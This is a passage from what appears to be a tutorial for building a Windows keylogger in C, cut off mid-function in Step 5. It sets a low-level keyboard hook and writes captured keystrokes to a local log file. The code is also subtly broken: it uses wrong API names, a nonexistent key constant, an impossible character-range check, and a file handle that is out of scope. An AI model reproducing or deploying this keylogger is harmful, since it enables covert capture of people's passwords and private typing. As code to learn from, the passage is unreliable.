    hwnd = CreateWindow();
    if (!hwnd) {
        return 1;
    }

    // Register the window class
    HINVISIBLEWINDOW = AfxRegisterWindowClass(WND_CLASS_NAME);

    // Set the hook
    hook = SetWindowsHook(WH_KEYBOARD_LL, KeyCallback);

    // Initialize logging
    FILE* logFile = fopen("keylog.txt", "a");
    if (!logFile) {
        printf("Failed to create log file!\n");
        return 1;
    }

    // Start the hook
    printf("Keyboard hook started...\n");
    return 0;
}
```

### Step 4: Handle Key Events
Define the callback function to handle key presses:
```c
LRESULT CALLBACK KeyCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    static int lastShift = 0;
    static int lastCtrl = 0;
    static int lastAlt = 0;

    if (nCode != 0) {
        if (wParam == WM_KEYDOWN) {
            // Check if the key is a keyboard key
            if (wParam == VK_KEY) {
                // Get the keyboard state
                int isShift = (lParam & 0x20) ? 1 : 0;
                int isCtrl = (lParam & 0x10) ? 1 : 0;
                int isAlt = (lParam & 0x08) ? 1 : 0;

                // Check if the key is a printable character
                if (wParam > 0xE0 && wParam <= 0x1F) {
                    char key = ' ';
                    switch (wParam) {
                        case VK_RETURN:  key = '\r'; break;
                        case VK_TAB:    key = '\t'; break;
                        case VK_ESCAPE: key = '\b'; break;
                        case VK_BACK:   key = '\b'; break;
                    }
                    LogKey(&key, logFile, isShift, isCtrl, isAlt);
                }
            }
        } else if (wParam == WM_KEYUP) {
            // Cleanup any active modifiers
            lastShift = 0;
            lastCtrl = 0;
            lastAlt = 0;
        }
    }

    return CallNextHook(nCode, wParam, lParam);
}
```

### Step 5: Log Each Key Press
The `LogKey` function appends each key to the log file:
```c
void LogKey(char* key, FILE* logFile, int shift, int ctrl, int alt) {
